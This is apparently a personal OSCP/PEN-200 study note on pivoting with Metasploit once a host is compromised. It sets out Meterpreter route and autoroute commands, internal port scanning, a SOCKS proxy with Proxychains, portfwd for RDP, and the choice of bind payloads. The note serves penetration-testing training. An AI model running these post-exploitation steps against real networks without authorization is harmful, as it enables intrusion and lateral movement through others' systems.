# Metasploit Pivoting

Use this after a compromised host reveals a network or service that Kali cannot reach directly.

Primary pivot decision guide: [[Active Directory/Pivoting-tunneling/Intro|Pivoting and Tunneling]]. Metasploit is one optional implementation alongside Ligolo-ng, SSH, Chisel, Socat, and other tools.

## 1. Identify an internal network

On the compromised host, inspect interfaces/routes:

```text
# Windows shell
ipconfig
route print

# Meterpreter
ipconfig
```

Example situation:

```text
Kali → compromised host → 172.16.5.0/24
```

## 2. Add an MSF route manually

Background the Meterpreter session, then route an internal subnet through that session:

```text
bg
route add 172.16.5.0/24 <SESSION_ID>
route print
```

Remove routes when needed:

```text
route flush
```

Once the route exists, Metasploit modules can connect to hosts reachable through that session.

Example internal scan:

```text
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.200
set PORTS 445,3389
run
```

## 3. Payload direction through a route

An MSF route primarily helps **Metasploit establish connections through the compromised host**.

If you exploit an internal host behind the pivot, a **bind payload** may be necessary because the internal host may have no route back to Kali for a reverse shell.

Example:

```text
set payload windows/x64/meterpreter/bind_tcp
set LPORT 8000
```

Mental model:

```text
Kali/MSF --route via session--> internal target

Bind payload:
Kali/MSF connects THROUGH pivot to target listener  ✓

Reverse payload:
internal target must independently route back to Kali  ?
```

## 4. Autoroute

Metasploit can inspect a Meterpreter session and add routes automatically:

```text
use post/multi/manage/autoroute
set SESSION <ID>
run
```

Then verify:

```text
route print
```

## 5. SOCKS proxy for tools outside Metasploit

MSF routes are directly useful to Metasploit modules. To send external applications through the pivot, start a SOCKS proxy:

```text
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
```

Default SOCKS port is `1080`.

Configure `/etc/proxychains4.conf`:

```text
[ProxyList]
socks5 127.0.0.1 1080
```

Then use external tools through Proxychains, for example:

```bash
proxychains <TOOL> <ARGS>
```

The PEN-200 example uses `xfreerdp` through Proxychains to reach an internal RDP host.

## 6. Meterpreter `portfwd`

For one fixed internal service, forward a local Kali port through the Meterpreter session:

```text
portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <INTERNAL_IP>
portfwd list
```

Example RDP forward:

```text
portfwd add -l 3389 -p 3389 -r 172.16.5.200
```

Then connect locally:

```bash
xfreerdp /v:127.0.0.1 /u:<USER>
```

Useful management syntax:

```text
portfwd delete ...
portfwd flush
```

## OSCP choice

```text
Internal network discovered
        ↓
Want route-like access and can deploy preferred pivot tooling?
        → use [[Active Directory/Pivoting-tunneling/Intro|normal pivot decision guide]]

Already have Meterpreter / want MSF-native pivot?
        ↓
route add OR autoroute
        ↓
MSF modules only? ──→ use route directly
External tools?    ──→ socks_proxy + Proxychains
One fixed service? ──→ portfwd
        ↓
If exploiting a host that cannot route back to Kali
        → consider bind payload
```

See also:
- [[Intro & Module Workflow]]
- [[Meterpreter & Post-Exploitation]]
- [[Active Directory/Pivoting-tunneling/Intro|Pivoting and Tunneling]]
